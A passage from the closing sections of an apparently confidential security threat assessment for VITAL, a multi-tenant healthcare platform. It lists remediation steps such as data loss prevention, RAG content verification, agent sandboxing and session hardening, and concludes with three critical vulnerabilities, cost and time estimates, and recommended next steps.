### 10.3 MEDIUM-TERM Actions (Weeks 5-12)

7. **MEDIUM: Data Loss Prevention (O-5)**
   - Implement DLP for bulk exports
   - Require approval for exports > 100 records
   - Block personal cloud storage domains
   - Implement user behavior analytics
   - **Risk Reduction: 12 → 6 (50% reduction)**

8. **MEDIUM: Shared Resource Security (T-1, T-3)**
   - Implement content verification for RAG
   - Sandboxed agent execution
   - Multi-party approval for sharing
   - **Risk Reduction: 12 → 6 (50% reduction)**

9. **MEDIUM: Session Security Hardening (O-3)**
   - Implement CSP headers
   - Set HttpOnly + SameSite=Strict
   - Input sanitization (XSS prevention)
   - **Risk Reduction: 9 → 3 (67% reduction)**

### 10.4 LONG-TERM Actions (Ongoing)

10. **Penetration Testing** (Quarterly)
11. **Security Awareness Training** (Monthly)
12. **Vulnerability Scanning** (Weekly)
13. **Incident Response Drills** (Quarterly)
14. **HIPAA Compliance Audit** (Annually)

---

## Conclusion

The 3-level multi-tenant architecture for VITAL introduces significant security challenges that must be addressed before production deployment. The current implementation has **3 CRITICAL vulnerabilities** with risk scores of 15-25 that pose immediate threats to:

1. **Patient privacy** (HIPAA violations)
2. **Organization data isolation** (competitive intelligence theft)
3. **Platform integrity** (total compromise possible)

**Immediate action required on:**
- O-1: Cross-organization data access (Risk Score: 25)
- T-2: Tenant admin account takeover (Risk Score: 16)
- P-2: Service role key leak (Risk Score: 15)

**Estimated time to secure platform:** 4-8 weeks (if prioritized)
**Estimated cost:** $150,000 - $300,000 (security engineer + tools + pen testing)

**Recommended next steps:**
1. Present findings to executive leadership
2. Halt production deployment until critical fixes are complete
3. Assign dedicated security engineer
4. Begin HIPAA compliance officer hiring process
5. Schedule external penetration testing

---

**Document Classification:** CONFIDENTIAL
**Distribution:** Executive Leadership, Security Team, Engineering Leadership Only
**Review Cadence:** Quarterly or after major security incidents
**Next Review Date:** 2025-12-26
